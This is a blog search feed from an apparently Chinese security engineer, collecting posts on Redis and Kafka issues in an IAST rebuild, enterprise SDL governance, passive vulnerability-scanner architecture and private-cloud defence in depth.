<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[IAST重构实录(一)]]></title>
      <url>/scanner/2021/07/22/iast-record-1/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>最近接了个新的坑，准备重构某个IAST的项目。由于以前针对集群和大数据的接入使用，都是对二次封装平台接触的多。然鹅这次需要自己上服务器完整趟坑，故而记录下流水账，给连续加的班留个纪念。
    </strong></span>
</p>

<h3 id="redis脏数据的问题">redis脏数据的问题</h3>

<p>在接入redis集群时，开始测的时候只做了单元测试，处理时基本没遇到啥问题。</p>

<p>但在整体联动试运行时，发现原来服务器集群上留存有原来测试脚本和agent，在往redis集群里打脏数据，格式与现有的不一致，导致连连报错。</p>

<p>后来通过定位crontab和现有进程，找出了运行的几个测试脚本和agent，将它们干掉做了缓释。</p>

<h3 id="redis集群配置问题">redis集群配置问题</h3>

<p>我们知道，redis集群上执行一些命令，如<code class="highlighter-rouge">flushall</code>和<code class="highlighter-rouge">keys*</code>等等，对线上环境可能会造成影响，所以一般会重命名，也就会用到<code class="highlighter-rouge">rename-command</code>。</p>

<p>但是我搞的时候不太熟，结果整的无论是redis-cli练连上去，还是开发急脚本用库去连，都不好使会显示：<code class="highlighter-rouge">command not found</code>。</p>

<p>所以后来我在redis配置文件里找到重命名的命令后，直接在任务函数里封装了一层远程cli命令，动态配置账密和rename以后的命令，引用配置来写死来执行危险操作（屏蔽了logging），如：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>redis-cli -h x.x.x.x -p xxx -a xxx commandxxx
</code></pre>
</div>

<h3 id="redis持久化异常">redis持久化异常</h3>

<p>一个异常提示的是：
<code class="highlighter-rouge">MISCONF Redis is configured to save RDB snapshots...</code>，这个其实就是持久化问题，一般不建议配置太长时间，该清理就清理，或者设置好expire时间。</p>

<p>还有个提示是redis达到max records还是啥玩意儿，提示的大概是  <code class="highlighter-rouge">OOM command not allowed when used memory &gt; 'maxmemory'</code>。</p>

<p>大概说是达到上限了，连接集群时，我尝试捕获错误也没捕获到。所以也不好根据这个来判定特征，对方只是直接拒绝连接了。</p>

<p>我处理这类情况一般是，针对键值配置好足额的expire时间，然后定期去判定dbszie，设定一个肩部峰值，暂定的是70%-80%左右。最后，再加上我之前cli版本的主动清理，事实上还是比较好处理这类问题的。</p>

<h3 id="kafka-rebalancing解决">kafka rebalancing解决</h3>

<p>注意，kafka如果读取时切换任务比较快，可以设置较短的时间避免rebalancing。</p>

<p>但是如果本身消费的时候，需要进行延时逻辑判定，或者需要等待kafka消息流等情况，就需要其他情况来控制了。</p>

<p>相关配置参数如下（python版本）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>session_timeout_ms(会话池过期时间，维持活跃)
heartbeat_interval_ms（心跳时间，涉及rebalancing）
max_poll_interval_ms（总过期时间，设置过短容易rebalancing）
</code></pre>
</div>

<h3 id="kafka时间段跳空后开">kafka时间段跳空后开</h3>

<p>我遇到的情况是，同一个groupid的情况下，在kafka topicA读数据流，选取了一个权重最大的时间点作为锚点。</p>

<p>然后我又以此时间点，去kafka topicB读取数据存入redis缓存，作为基准分析数据。</p>

<p>等我回过头再去kafka topicA读数据流时，发现新读取的数据流时间点，居然比存入缓存的topicB时间更晚。</p>

<p>我仔细想了想，是不是因为在我读取kafka topicB去存的时候产生了延时，然后kafka topicA数据流的offset其实依然在跑。</p>

<p>但是我消费的时候，设置了auto commit和手动commit和close，kafka topicA的二次锚点还是会跳空比缓存数据后开，这个问题目前偶尔会跳出来，留待之后观察。</p>

<h3 id="批量插入和消费问题">批量插入和消费问题</h3>

<p>主要聊聊kafka消费和redis的读插，两个比较简单的问题，放在一起聊了。</p>

<h4 id="kafka读取">kafka读取</h4>

<p>本身kafka属于流数据，通过offset控制读取的点位，竞争消费的问题由groupid控制解决。</p>

<p>但是在竞争读取数据时，要知道redis缓存上限原来是按单进程进行窗口结算的。</p>

<p>我在开多线程以后，如果从某个线程读取窗口数据，mset压入redis集群触发存储告警上限。</p>

<p>这时候我们需要主动杀死线程，这样可能会丢失另外几个相当多的正在压入redis的数据。</p>

<p>解决方案的话，我这边考虑的是多起几个节点和或者线程，减少单个单线程和节点的数据集。</p>

<p>一旦停止，能通过少量时间的time-sleep来缓释节点的数据处理压力，也能避免<code class="highlighter-rouge">max_poll_interval_ms</code> or <code class="highlighter-rouge">session_timeout_ms</code>设置的时间过长的问题。</p>

<h4 id="redis读写之殇">redis读写之殇</h4>

<p>在取redis数据的时候，读的动作和速度肯定是延后于写的。本身这事儿就不应该用消息队列型存储来搞，在数据量堆积到时候读压力巨tm大。</p>

<p>实时规则处理可以用spark或者flink框架，离线的话完全可以采用hive（kafka2hive）存储kafka结果，定时拉取表对比生成临时hive表，再用脚本规则过滤去输出结果。</p>

<p>这里因为一些限制借助不了大数据平台的能力，也不能指望我为一个项目搞个一套平台框架。</p>

<p>所以呢，还是沿用的原来的思路，借助redis缓存，形成时间窗口。</p>

<p>然后依据单个kafka数据的index_id和时间点作为锚定标准，去对比分析另一个kafka数据流，最后完成阶段性循环。</p>

<p>但是在读redis的时候，批量mget数据意义不大，貌似提速不了多少。</p>

<p>我这边是根据两个kafka队列的index_id去做判定的。</p>

<p>如果一次性mget多个数据，通过多线程去做index_id的关联逻辑判定时，如果规则判定本身不怎么耗时的话，你会发现并没有快多少。</p>

<p>所以结论是，大头还是落在kafka读取的压力上，取了以后就能去做分布式匹配。</p>

<h3 id="结语">结语</h3>

<p>本小节只简单聊了下之前踩过的准备坑，针对IAST本身没有聊太多，后面的续篇会简单介绍下。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[业务SDL的上岸体历（二）]]></title>
      <url>/operation/2021/03/09/sdl-result2/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>之前已经聊过在甲方团队做DevSecOps能力建设的零碎轨迹，但是针对项目级安全治理的关键细节，我们还不曾详述，那么接下来简单讲一讲。</strong></span>
</p>

<h3 id="安全合规评审">安全合规评审</h3>

<p>对于重要的基础系统或者服务，我们如何做好完整的评审闭环呢？</p>

<p>这里我们分三个阶段去达成这个目标：</p>

<h4 id="信息采集阶段">信息采集阶段</h4>

<ul>
  <li>问卷和自查</li>
</ul>

<p>首先，最了解系统的人肯定是相关开发人员和产品经理。那么整个企业或者整个业务线，拥有相似的研发习惯或者通病的话，批量进行问卷和自查能帮我们解决掉很多事情。</p>

<p>当然，很多人可能会说，这种东西业务方不一定会配合你去做，安全人员在大部分企业内的地位是相对低的。</p>

<p>好一点的可能是独立出来，直线向CTO汇报；次一点的挂在强势的运维总监下面，好赖能在平时做做事务推动。再次的话，就是那种一个人的安全部，除了怼二开/购置商业产品，还有日常和业务线撕逼外，其实存在感不是很大。</p>

<p>但是话又说回来，做不做是一回事，如何去达成是另一回事。</p>

<p>能用点手段，自上而下去推动自然是最好的。</p>

<ul>
  <li>文档发掘</li>
</ul>

<p>如果是规范完备的研发线，通常会存在相关的研发说明和产品文档。</p>

<p>我们做风险评估之前，也会从大量的信息中主动提取疑似脆弱点，作为后面评估的参考依据。</p>

<p>后面的工作中，我们能通过对比记录，更加快速的定位到风险点。</p>

<p>同时也能在一定程度上，避免在过长的评审时间跨度之后，产生不必要的风险遗漏。</p>

<h4 id="主动评估阶段">主动评估阶段</h4>

<p>在这个阶段，我们主要会对下面三个风险点进行分析。</p>

<ul>
  <li>接入风险：</li>
</ul>

<p>在使用某个系统的时候，可能系统本身是不具有高风险的。</p>

<p>但是由于业务方操作不当，或者配置失误，有可能会导致产生接入性风险。</p>

<p>所以这块儿的治理，一般是针对中台或者基础服务，需要提出规范制度进行管控。</p>

<ul>
  <li>架构风险：</li>
</ul>

<p>在架构设计之初，很多产品的安全评审是不足的。所以在架构设计中会出现潜在的风险。</p>

<p>在设计逻辑架构时，我们会考虑到数据流转和业务场景转换，在关键流程节点上往往需要制定审计策略。</p>

<p>在设计系统架构时，我们需要考虑到是否接入了安全能力组件或者安全服务中台；是否符合固有安全架构设定；是否符合冗余灾备法则。</p>

<p>在设计网络架构时，我们需要考虑是否进行了线上线下隔离；所在网络区域是否对外开放；如果接入了外网，是否接入了SSO+IAM+VPN；是否会留存重要的操作日志；是否能做流量安全审计。</p>

<ul>
  <li>基础风险：</li>
</ul>

<p>运行时系统评估：WEB层面主要针对OWASP TOP风险进行核查；系统本身层面会审计是否引用了不安全的第三方服务（组件）；主机层面是否对基线（端口、配置、内核等）的进行了加固核查。</p>

<p>代码评估：分析代码中是否存在硬编码和配置风险；是否引用了不安全的第三方包；是否存在常见的漏洞；是否存在明显的逻辑链路失误。</p>

<p>数据评估：是否存在未脱敏数据的批量开放展示；是否存在敏感数据存储未加密，是否存在第三方数据不合规引用，是否接入了数据溯源和加密分发等措施。</p>

<h4 id="自动化覆盖阶段">自动化覆盖阶段</h4>

<p>在完成风险评估后，我们需要有一套完整的风险验收的闭环。</p>

<p>在我们完成主动评估阶段的工作后，通过紧急程度分级进行修复推进。</p>

<p>而后，我们再结合基础CMDB的数据，借助自动化能力，进行定期巡检复核。</p>

<ul>
  <li>接入风险覆盖：</li>
</ul>

<p>可以通过注册依赖和代码层面，进行特征对比检查，校验是否存在接入失衡导致的风险。</p>

<ul>
  <li>架构风险覆盖：</li>
</ul>

<p>自动化核查供应链，实现第三方对接监测，枚举安全中台能力覆盖，枚举边界兜底措施覆盖等等。</p>

<ul>
  <li>基础风险覆盖：</li>
</ul>

<p>接入黑盒漏扫、基线、白盒规则，后期通过自动化观测，进行变更管控和风险复核。</p>

<hr />

<h3 id="基础能力兜底">基础能力兜底</h3>

<p>对于整个企业、业务线、乃至具体到单个系统。除了本身固有的风险以外，我们更需要从宏观的架构出发，使用基础安全的能力进行兜底。</p>

<h4 id="组件管理">组件管理</h4>

<p>首先，企业的研发线通常会引用开源组件，这批组件相对固定，所以维护起来有一定价值。</p>

<p>从安全的角度来讲，我们可以通过接入CMDB库来管理组件版本，引入对CVE官方或者开源组件官方的漏洞舆情感知，方便我们在紧急情况进行有序的版本推修。</p>

<p>当然，我们也可以通过脚手架的形式，把常用的组件进行打包，进行统一的版本升级管理。</p>

<p>其次，我们还可以对于常见的开源组件做二改加固，单独维护一套相对安全的组件版本。</p>

<h4 id="能力引入集成">能力引入集成</h4>

<p>这个也是老生常谈了，对于安全能力的引入和集成，可以分为下面几个点去实施。</p>

<ul>
  <li>安全组件：</li>
</ul>

<p>如果我们拥有维护安全组件的能力，要么指望通过规范，推广让研发线做引入。要么就直接在流水线中进行默认集成，如果上线出现问题再做版本回退。</p>

<ul>
  <li>黑白盒：</li>
</ul>

<p>在流水线发布的时候，会自动化进行增量的黑白盒扫描，此时的优先级调度，建议排在队列前面。</p>

<p>然而这时候如果测出问题，并不建议直接阻断构建，因为我们一切的工作都是为了保障业务稳定性而服务的。</p>

<p>如果出现高危漏洞，可直接推送告警给安全人员，审核确认后可以跟研发人员沟通紧急修复。如果紧急程度不高，我们可通过邮件或者工单沟通好，徐徐图之。</p>

<ul>
  <li>IDE插件</li>
</ul>

<p>在代码交付之前，业务方使用IDE安全插件，能很好的对代码做预修正。</p>

<p>常见的问题，能在自核验的过程中解除，减少其他环节的耗时。</p>

<ul>
  <li>代理插件</li>
</ul>

<p>在质量测试和开发中，一般会在本地PC进行调试，也会访问一些搭建好的新服务。</p>

<p>这时候如果本地agent（浏览器）设置了相关代理，将测试流量转发到安全中心。就能很好的对增量的服务和接口进行风险确认，及时防患于未然。</p>

<p>当然这个需要配置代理白名单，区分测试环境和线上环境，避免流量互串。</p>

<h4 id="底层服务化">底层服务化</h4>

<p>除了必要的安全检测能力，其他底层支撑能力也需要实现服务化。</p>

<p>很多企业目前的安全建设进度，其实还处在做二开或者怼商业产品的节点，不定时做做渗透和众测，但自身并没有精力把底层的安全能力树立起来做支撑。</p>

<p>因此，我们需要根据企业目前的情况进行分期建设，针对各个产品线进行安全缺失度评测和适度补全。</p>

<p>首先，我们需要强化底层的认证机制，借助内部的证书分发中台，将鉴权认证细粒度到业务方的IDC、服务、接口，尽可能实现非敏感区域全覆盖。</p>

<p>其次，需要实现存储能力的标准化，自适应调整敏感数据和文件的存储结构。将失衡的加密手段，以及错误的存储桶访问配置，实现无感知的安全强化加固。</p>

<p>此外，我们还需要对业务容器化的流程做融合，把相关能力嵌入到云管平台及配套体系中，在企业“云化”的发展中形成安全助力。</p>
]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[业务SDL的上岸体历（一）]]></title>
      <url>/operation/2021/02/14/sdl-result1/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在甲方做业务SDL的几年，在落地方面也做了不少努力。一是得看着业务大爷们的脸色，二是得假装硬气的扮猪吃老虎，一路走来可谓是一把辛酸泪。</strong></span>
</p>
<p>系列文章，针对业务安全的从0-1的介绍，从小团队到大团队的风格转变，</p>

<p>闲话不多扯，我们团队在SDL方向，针对公司现状进行了多个维度的治理。</p>

<p>在本文笔者会根据过往的治理工作，在业务建设从0到1进行剖析，给大家落地经验的参考。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-12-7/1607328853415-SDLGO.png" alt="SDL建设落地" /></p>

<h3 id="基础审计运营">基础审计运营</h3>

<p>在安全建设初期，我们会着重针对事前、事中、事后为单位，进行安全审计运营。</p>

<h4 id="事前审计"><em>事前审计</em></h4>

<p>在事前的维度，我们会以域名和服务Key为单位，对前后端的资产进行梳理，嵌入SOC进行运营管理，并进行安全审计流程闭环。</p>

<p>在项目上线前，我们会对提测前的代码进行人工Review，进行安全合规的风险评估。</p>

<p>对于安全检查大致包括：</p>

<ul>
  <li>OWASP TOP 10</li>
  <li>OWASP API Security TOP 10</li>
  <li>常见的逻辑漏洞</li>
</ul>

<p>此外，我们还会根据研发同学的习惯，制定相关核查制度，进行重点检查，提升检察效率。</p>

<p>对于数据合规会重点检查：</p>

<ul>
  <li>数据接口是否脱敏</li>
  <li>数据存储是否加密</li>
  <li>传输是否加密</li>
  <li>数据关联性是否解耦</li>
</ul>

<p>还有部分没有全部例举出来，会严格的按照合规白皮书的标准来实施。</p>

<p>在审计完毕后，会在SOC平台进行数据留存，发工单向业务同学督促修复。</p>

<p>如果出现了延期，系统工单会进行逐级递进，通知其上级，直到业务方响应闭环为止。</p>

<p>虽然这些制度可能比较难推行，但确实是非常有必要的，这需要自上而下的认可才能完成。</p>

<p>只有把代码安全的指标，像代码质量考核那样，加入业务研发同学的KPI之中，才能真正引起大家对安全的重视。</p>

<h4 id="事中监督"><em>事中监督</em></h4>

<p>在每个项目的大型迭代时，我们也会进行人工安全审计。</p>

<p>除了针对迭代出现的安全问题以外，主要还会检查部分误添加的线上测试数据，以及研发同学无意中进行的硬编码、弱口令配置、敏感数据打印等等。</p>

<p>由于当时工具比较原始，除了借助半自动化的代码审计工具（如IDE、Fortify）以外，也会读取第三方设备收集入库的日志，自行写脚本筛选核查。</p>

<p>当然这些工作，后面也逐步被接入CICD流水线的自动化平台所替代。</p>

<h4 id="事后管控"><em>事后管控</em></h4>

<p>在各个系统正常运营期间，我们需要做的是借助各种安全入侵防护产品（自研or商采），譬如IDS、WAF、RASP之类的进行纵深体系检测，再借助风控与法务部门的力量，对出现的风险事件进行溯源和应急响应。</p>

<p>为啥这里说的是纵深检测而不是纵深防御，其实是早期在使用安全产品的时候，更多的需要去借助人工去复核，没有很好的进行产品联动。</p>

<p>当然大家可能觉得是因为没有采购同一家产品，造成了兼容性缺失的问题，才会导致工作量指数级别上升。</p>

<p>其实笔者觉得这块儿的工作，无论是厂商本身来做，还是依靠团队人工对信息流进行补齐，都是相对次要的。</p>

<p>更关键的点在于，是我们需要优化好安全运营规则，让更严重的事务和更优先的级别，及早的被我们感知到并进行应急处理，而不是淹没在海量告警和镭射动态展示大盘之中。</p>

<h3 id="自动化能力建设">自动化能力建设</h3>

<p>在这个阶段，我们投入了更多的精力去建设团队的安全自动化能力，以求解放人力去搞研究工作。</p>

<p>在此期间，我们针对性的对缺失的安全能力，对标业内互联网企业的标杆进行剖析，发现主要有几个点是亟待改善的。</p>

<h4 id="黑盒安全能力"><em>黑盒安全能力</em></h4>

<p>我们利用线下测试环境和镜像流量，重点建设了主被动扫描器（DAST），其中包含黑盒漏扫和基线核查平台；同时，也针对交互式扫描（IAST）能力进行强化，对代码执行进行污点插桩和编号，监控系统的输出和落地执行结果，方便向源头进行追溯。</p>

<h4 id="白盒安全能力"><em>白盒安全能力</em></h4>

<p>针对白盒扫描（SAST），我们接入了多个扫描引擎。除了质量CICD流水线平台自带了安全插件进行优化外，还对商业化的白盒安全产品进行了外采接入；除此之外，自研的引擎里，还加入了针对Git平台的关键词和配置、组件版本依赖检查（支持分支），保障在接入流水线后，能尽可能完整的覆盖到所有代码的检查。</p>

<h4 id="数据合规检查"><em>数据合规检查</em></h4>

<p>针对这块儿，我们着重对数据库里存储敏感数据字段进行核查，也结合XIDS对流量里包含的敏感数据进行了监控。</p>

<p>同时，我们还结合DLP监管的记录，以及对明暗水印机制的设计，对数据外泄事件起到了一定的防控作用。</p>

<h4 id="安全sdk治理"><em>安全SDK治理</em></h4>

<p>每个公司的技术栈是不同的，所以针对内部应用最多的技术栈代码，针对性的开发安全SDK也显得比较重要。</p>

<p>除了本身对研发团队提出安全编码制度以外，我们还对研发团队提供了安全SDK，也提供了IDE安全检查插件，通过微侵入式的方法，在一定程度上保障了代码的安全。</p>

<p>当然，这样产出的代码，可能在交付给第三方合作厂商时，会单独进行脱敏分支开发，在一定程度上会提升成本。但考虑到这方面的业务量不多，还是合算的。</p>

<h3 id="风险链路治理">风险链路治理</h3>

<p>在SDL建设到了这个阶段，我们已经有了一定的安全自动化能力，那么如何去实现突破呢？</p>

<p>在梳理业务链路中的风险后，我们开始针对威胁进行建模，从体系架构上自上而下进行治理。</p>

<p>其中，我们重点关注了IPDRR和STRIDE模型，并辅以DREAD模型进行威胁评级，针对原有安全能力的缺失进行优化联动，也对现有的安全风险点进行收敛治理。</p>

<p>从不同的业务场景，以及不同的数据流程，分别对风险定制了削减措施，分配人力形成项目组，推进治理优化工作。</p>

<p>具体的风险链路大盘，这里由于内容敏感不方便直接发出来，我们就简单谈谈重点项目的建设工作。</p>

<h4 id="资产库的收敛"><em>资产库的收敛</em></h4>

<p>在原先的工作中，我们自己的资产库更多的会去依赖于运维部门的注册信息，然后我们内部通过扫描器进行的资产补充。</p>

<p>后来发现这样做有个问题，我们在针对细粒度的资产标签，譬如新增端口、机器所属域、服务类型列表、迭代接口等等，无法及时的掌控，这样对我们的纵深体系的监测是不利的。</p>

<p>所以在我们着重进行了这方面能力的补充，通过被动监控流量，以及主动对代码AST树进行梳理的方式，对复杂的调用进行网状关系绘制，以及对标签关联的资产进行聚类。</p>

<p>这样，在出现问题后，我们也能很快的进行阻断和溯源定位。</p>

<h4 id="内部巡检"><em>内部巡检</em></h4>

<p>针对内部的一些通用型漏洞，由于信息关联度问题，我们在原来的工作中没有很好的进行横向打通。</p>

<p>在不断加强内部对于0day、1day的识别能力后，我们能更好的去识别入侵事件。</p>

<p>在后面的SOC运营平台的建设工作中，会针对漏洞元素进行细粒度的手动标签，也支持了自动化识别，加强了针对资产的测试环境和边界环境，及时进行横向巡检，将风险扼杀于摇篮之中。</p>

<h4 id="边界治理"><em>边界治理</em></h4>

<p>在针对诸多风险进行治理时，必不可少的需要考虑到对边界安全进行收敛。</p>

<p>在这方面的工作中，我们可以考虑做以下的工作：</p>

<ul>
  <li>针对出入的流量进行重点核查</li>
  <li>对开放的外网服务进行一键式深度防护</li>
  <li>启用备份机制，随时对出现漏洞升级故障的边界服务进行替换</li>
  <li>对边界资产进行即时扫描防控</li>
  <li>自动化核查应该把边界的优先级提升到最高</li>
</ul>

<p>我们前面对于资产库的优化工作，也是能为边界安全的治理提供效能的。</p>

<h4 id="接口人制度"><em>接口人制度</em></h4>

<p>我们原来的业务方接口人，都是资产定位到项目组为止。</p>

<p>这样的话，很难在具体风险发生时，最快速度联系到个体接洽解决，在推进修复的过程中也很容易扯皮。</p>

<p>所以后来我们采用了业务方接口注册制度，让业务方主动去做项目归属个体和人员backup的填写，并且结合内部的人力资源存留的注册信息，定期向业务方确认项目变动情况。</p>

<p>总之，我们需要保障在项目存活的安全生命周期中，实现人员响应可控、权限周期可控、人员备用可控。</p>

<h4 id="第三方合作建设"><em>第三方合作建设</em></h4>

<p>在第三方合作体系的建设过程中，我们也参照业内的情况，做了不少工作。</p>

<p>在这方面的治理上，虽然有不少标准可以参考，但并没有统一的方案。</p>

<p>其中需要治理的内容有：</p>

<ul>
  <li>第三方合作商的业务</li>
  <li>第三方SDK的引入核查</li>
  <li>第三方流量接入时的监控前置</li>
  <li>第三方账号监控的核查</li>
</ul>

<p>这些东西太多，只能稍微例举几项。真正想要做好，需要对各业务线的情况进行深入了解，结合企业自身的情况进行定制。</p>

<p>同时，这也是外部审计公司很难在短时间内给出完整方案的，需要内部的安全人员去做更多的探索。</p>

<p>后面的话，针对这块儿可能会单独提出来跟大家聊聊，讨论下有哪些通用的解决方案。</p>

<h3 id="指标订立和回归">指标订立和回归</h3>

<p>在针对SDL实现流程化管理，对治理成果进行验收时，我们需要重点注意的是，得对前期订立的指标做验证回归。</p>

<p>这些无论是在安全工作的KPI中体现，还是向业务方进行成果透明化展示，都是有意义的。</p>

<p>这里举例几个方面，给大家参考下指标订立的原则：</p>

<h4 id="风险收敛"><em>风险收敛</em></h4>

<p>我们针对需要重要防控的项目，在风险收敛比例和收敛耗时方面，是需要订立一定的指标的。</p>

<p>如果在这期间发生了安全风险引起的资损事件，会侧重考核我们是否做出了合适的应对措施，针对资损事件进行弥补和挽回。</p>

<h4 id="漏洞回归"><em>漏洞回归</em></h4>

<p>对于漏洞指标订立，我们会针对高危漏洞的数量、漏洞类型趋势进行统计。</p>

<p>其中，会区分外部SRC提交和内部发现情况，从不同维度进行趋势计算。</p>

<p>同时，我们针对黑白盒自动化漏扫的召回率和精确率，也会做同期的月度、季度、年度对比。</p>

<p>最终，我们也会添加插件数、服务数、接口数等作为变量，从综合层面去判定成果，避免在判定权重方面发生缺失。</p>

<h4 id="服务健康"><em>服务健康</em></h4>

<p>这个有点类似于QA的质量考核指标，如果一个服务经常出现代码风险，经常出现漏洞，通常这个服务的健康评分会比较低。</p>

<p>这个是针对业务方的，也是对我们治理结果的的反馈之一。</p>

<p>对于服务安全，我们订立了几个指标，譬如漏洞修复率、安全产品接入率、漏洞反复率、风险发生率、鉴权接入率等等。</p>

<p>最后，通过单个服务乃至业务线作为基准元素，我们也会反过来对比考核各个业务线安全的质量，从而在更高的维度评价业务安全的产出。</p>

]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[被动漏扫系统实践]]></title>
      <url>/scanner/2021/02/05/axe-scan/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>做被动漏扫也有很长一段时间了，期间自用的版本和企业公用的版本，各单独起分支做持续迭代。目前市面上优秀的轮子已经不少，所以这里只简单讲讲企业内部漏扫设计的思路。</strong></span>
</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-12-9/1607503446666-%E8%A2%AB%E5%8A%A8%E6%BC%8F%E6%89%AB%20(1).jpg" alt="被动漏扫全景图" /></p>

<h3 id="流量来源">流量来源</h3>

<p>在平时的漏扫使用中，代理流量来源大概有这么几个：</p>

<h4 id="browser_plugin"><em>Browser_Plugin</em></h4>

<p>主要代表有chrome插件，对测试环境进行访问时，会把PC端流量传输到流量center。</p>

<h4 id="类burp插件"><em>类Burp插件</em></h4>

<p>在进行测试的过程中，我们需要设置多层代理。</p>

<p>将通过类burp软件的流量，通过代理agent中转，再传输到流量center。</p>

<h4 id="nids"><em>Nids</em></h4>

<p>针对节点主机部署agent，包含蜜罐、节点网关等等，通过流量收集转发到流量center。</p>

<h4 id="ngnix"><em>Ngnix</em></h4>

<p>在ngnix代理层面，通过镜像旁路流量收集，转发到流量center。</p>

<p>最后，我们在流量center处理流量格式后，再经过中间件（kafka），传输到数据库es存储起来，这样既可以用于被动漏扫进行流量复刻，也可以用于后面kibana（或者二改的）前端进行查询。</p>

<h3 id="扫描调度">扫描调度</h3>

<p>在我们覆盖到足够多的流量后，会通过任务调度对存储的流量进行fuzz，这里先假一些基础条件：</p>

<h4 id="强制线下环境"><em>强制线下环境</em></h4>

<p>如果是线上流量测试，敏感线上接口需要打标签和加白名单，也会涉及https和qps控制速率的问题，比较麻烦。</p>

<h4 id="token或者session池"><em>token或者session池</em></h4>

<p>除非线下环境本身设置的是登录态能够长期保持的，我们需要单独维护一套token或者session池，通过不同业务线和权限级别分类，方便在测试时做对比替换。</p>

<h4 id="线下环境保持稳定"><em>线下环境保持稳定</em></h4>

<p>由于公用的资源有限，在测试完毕后，质量人员一般会把资源给下掉，这样时间一长我们收集到的流量会失效。</p>

<p>做好准备工作，我们就可以进行扫描调度了，我们这里采用的是下发任务给多个扫描agent的方式。任务会存在中间件redis管道里，等待各个agent读取之后，然发送fuzz请求包。</p>

<p>这样虽然扫描进度不一样，但是配置和命令是统一在控制台下发的。保障在启动扫描时各方的统一可控，出现问题也能及时关停止损。</p>

<p>在扫描完成后，我们会把结果传输到数据库中台，再通过人工review进行确认，但这属于漏洞sdl闭环的事儿，这里就不多提了。</p>

<h3 id="漏扫模块">漏扫模块</h3>

<p>漏扫模块的话，我们主要考虑检测下面几个方面：</p>

<h4 id="owasp-top-10"><em>OWASP TOP 10</em></h4>

<p>对于常规漏洞的检测是需要的，涉及一些延时的漏洞（比如前端渲染、ssrf），我们主要依靠第三方平台比如类ceye的内网版本，通过标签的形式进行延时漏洞确认。</p>

<h4 id="owasp-api-top-10"><em>OWASP API TOP 10</em></h4>

<p>其实自动化只能覆盖部分检测，还有部分需要人工辅助评估。</p>

<p>只能说api检测这块儿，我们可以做的探索还比较多。</p>

<h4 id="poc探测"><em>POC探测</em></h4>

<p>主要针对可能出现的服务和cms类漏洞进行poc探测，对主动扫描能力进行补充。</p>

<p>很明显，部分poc通过流量复刻进行fuzz，会比主动扫描准确的多。</p>

<h4 id="fuzz检测"><em>FUZZ检测</em></h4>

<p>这块儿的话，是我们根据安全团队的测试经验和业务方的特性，进行fuzz字典定制的，主要用于发现一些意外绕过和泄露的情况。</p>

<p>我们使用流量复刻的手段进行fuzz，能在权限认证可控的情况下，针对正常的返回进行对比，去除掉一些误报，提升检测的准确性。</p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[私有云安全-纵深防御设计实践]]></title>
      <url>/cloud/2021/01/30/strategic-depth-sec-design/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在对于私有云安全落地的实践中，如果我们已经有了一定的安全基础，对于后期架构策略的设计，需要花更多的精力在纵深防御和整体联动之上。</strong></span>
</p>

<p>下面笔者会从多个维度，分析下能在私有云进行建设的纵深防御工作。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-17/1605596169406-%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1.jpeg" alt="纵深防御" /></p>

<h3 id="安全产品矩阵">安全产品矩阵</h3>

<p>在私有云的纵深防御中，有些同学可能觉得安全产品堆叠实际不会产生很好的效果，更大的价值上只是为了把每年采购的预算给花出去。</p>

<p>但其实，如果我们合理安排对于各项领域安全产品的组合，在一定程度上也能为我们的系统迁移上云，提供更加可靠的保障。</p>

<p>下面笔者会简单聊下各个领域的产品，为私有云安全架构的建设工作提供参考。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-16/1605518469119-%E4%BA%A7%E5%93%81%E7%BA%B5%E6%B7%B1.jpeg" alt="产品纵深" /></p>

<h4 id="通信安全"><em>通信安全</em></h4>

<p>在通信流量的安全控制上，通常我们会对边界进行阻断，再通过节点部署安全产品，逐步进行流量监控的补充。</p>

<p>对于堡垒机，我们可以通过4A认证，结合IAM和VPN对出入的流量进行细粒度管控。</p>

<p>边界防火墙，则可以对私有云出入口，以及不同安全域之间的流量进行拦截。</p>

<p>至于NIDS，则是部署在节点之后，利用高吞吐量和对内网流量协议的高切合度的分析规则，对防火墙没能拦截的内容做补充分析。</p>

<h4 id="主机安全"><em>主机安全</em></h4>

<p>在主机系统安全上，其实也存在很多竞品，功能有不少重合之处。</p>

<p>比较常用的就是HIDS，它会监控主机的事件和系统调用的监控，但对系统做适配和定制化。</p>

<p>而EDR作为终端安全产品概念，也被一些厂商概念混用，拿去做IDC（或者容器）安全监控了，这个不做过多的讨论。</p>

<p>此外，我们针对WebServer层面，是可以考虑嵌入RASP，做运行时安全监控的。
但是这个相对来讲，对业务性能影响也会更多，所以需要做审慎启用。</p>

<p>在私有云的容器群中，我们也可以考虑部署蜜罐。</p>

<p>业务方一般不会主动去访问蜜罐主机，所以当它们意外收到访问流量时，就可以在不动声色的情况下，被动监控黑客的横向拓展动作。</p>

<h4 id="数据安全"><em>数据安全</em></h4>

<p>我们的系统在上云时，除了要考虑数据库访问的稳定性和资源分配合理性，也需要对数据库访问的SQL进行行为分析。</p>

<p>或者，我们也可以直接针对单条恶意SQL进行阻断，或通过链式SQL分析进行告警，这就涉及到数据安全审计（数据库防火墙）了。</p>

<p>与此同时，我们在对外展示数据和存数据入库时，也可能涉及到加解密和脱敏问题，尤其是第三方人员账号介入，公共的云加解密（脱敏）平台能很好的缓释相关风险。</p>

